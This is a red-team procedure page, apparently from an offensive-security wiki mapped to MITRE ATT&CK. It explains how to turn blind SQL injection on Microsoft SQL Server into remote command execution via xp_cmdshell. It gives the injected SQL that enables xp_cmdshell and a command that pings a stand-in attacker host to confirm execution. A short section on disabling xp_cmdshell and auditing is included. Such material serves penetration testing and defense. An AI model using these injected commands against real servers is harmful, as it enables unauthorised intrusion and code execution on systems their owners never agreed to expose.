---
tags:
  - rce
  - xp_cmdshell
  - sqli-escalation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/execute-sql-ping-via-xp_cmdshell]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:32:48.559Z'
sub_techniques: []
id: 5d56f2b0-82c4-4bad-822e-2eae14cb976d
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Windows Command Shell]]'
---
# Escalate-to-RCE-via-xp_cmdshell

## Summary

This procedure uses blind SQL injection to enable and execute xp_cmdshell on SQL Server, achieving remote code execution on the production server with a safe demonstration command.

## Description

xp_cmdshell is a SQL Server extended procedure that runs OS commands if enabled. Through SQLi, inject to call it, escalating from DB access to system-level execution. Targets misconfigured SQL Servers with xp_cmdshell active. Requires prior SQLi access. Outcomes: Arbitrary command execution, critical impact.

## Requirements

1. Established blind SQLi access to SQL Server
2. xp_cmdshell enabled (common in vulnerable setups)
3. Knowledge of safe commands to avoid harm

## Defense

Defensive measures and detection strategies:

- Disable xp_cmdshell via sp_configure 'xp_cmdshell', 0
- Restrict SQL Server permissions and monitor extended proc calls
- Use least privilege for DB accounts and audit command executions

## Objectives

1. Enable and invoke xp_cmdshell via SQLi
2. Execute proof-of-concept command to confirm RCE
3. Demonstrate potential for harmful actions

## Instructions

### Step 1: Check and Enable xp_cmdshell

**Context**: Use SQLi to verify and enable if needed.

**Command** (injected SQL):
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

> Inject via blind SQLi; success inferred from no errors or conditions.

### Step 2: Execute Safe Command

**Context**: Run a ping to prove RCE without damage.

**Command** ([[commands/execute-sql-ping-via-xp_cmdshell]]):
```sql
EXEC xp_cmdshell 'ping -n 1 attacker-ip';
```

> Inject and monitor for ping response on attacker's side, confirming execution on server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Windows Command Shell]]

### Sub-Techniques


## Commands Used

- [[commands/execute-sql-ping-via-xp_cmdshell]]

## Tools Used


## Tags

- [[rce]]
- [[xp_cmdshell]]
